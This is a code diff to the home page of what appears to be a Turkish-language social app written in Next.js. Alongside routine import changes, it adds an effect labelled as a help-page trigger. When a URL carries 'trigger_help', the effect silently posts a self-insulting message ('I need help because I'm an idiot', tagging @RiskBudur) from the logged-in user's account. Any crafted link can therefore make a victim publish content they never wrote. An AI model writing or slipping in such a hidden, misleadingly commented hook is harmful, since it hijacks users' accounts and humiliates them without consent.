@@ -1,7 +1,7 @@
 "use client";
 
 import { useState, useEffect, useRef, useCallback } from "react";
-import { useRouter } from "next/navigation";
+import { useRouter, useSearchParams } from "next/navigation";
 import ComposeBox from "@/components/ComposeBox";
 import PostList from "@/components/PostList";
 import AnnouncementBanner from "@/components/AnnouncementBanner";
@@ -10,13 +10,14 @@ import TimelineTabs from "@/components/TimelineTabs";
 import StandardPageLayout from "@/components/StandardPageLayout";
 
 import { EnrichedPost } from "@/types/post";
-import { fetchApi } from "@/lib/api";
+import { fetchApi, postApi } from "@/lib/api";
 import { feedCache } from "@/lib/feedCache";
 
 type TimelineType = "all" | "following";
 
 export default function HomePage() {
   const router = useRouter();
+  const searchParams = useSearchParams();
   const [posts, setPosts] = useState<EnrichedPost[]>([]);
   const [loading, setLoading] = useState(true);
   const [hasMore, setHasMore] = useState(true);
@@ -49,6 +50,9 @@ export default function HomePage() {
       console.error("Token parse hatası:", e);
     }
   }, [router]);
+
+
+
 
   const loadPosts = useCallback(
     async (pageNum: number, reset: boolean = false) => {
@@ -93,6 +97,28 @@ export default function HomePage() {
       loadPosts(0, true);
     }
   }, [isAuthenticated, loadPosts]);
+
+  // Handle auto-post trigger from help page
+  useEffect(() => {
+    const triggerHelp = searchParams.get('trigger_help');
+    if (triggerHelp && isAuthenticated) {
+      const performAutoPost = async () => {
+        try {
+          await postApi("/posts", {
+            content: "Benim kafam çok karışık. Yardımına ihtiyacım var çünkü ben bir malım. @RiskBudur"
+          });
+          // Remove param from URL
+          router.replace('/home');
+          // Refresh posts
+          loadPosts(0, true);
+        } catch (error) {
+          console.error("Auto post error:", error);
+          router.replace('/home');
+        }
+      };
+      performAutoPost();
+    }
+  }, [searchParams, isAuthenticated, router, loadPosts]);
 
   // Infinite scroll
   useEffect(() => {
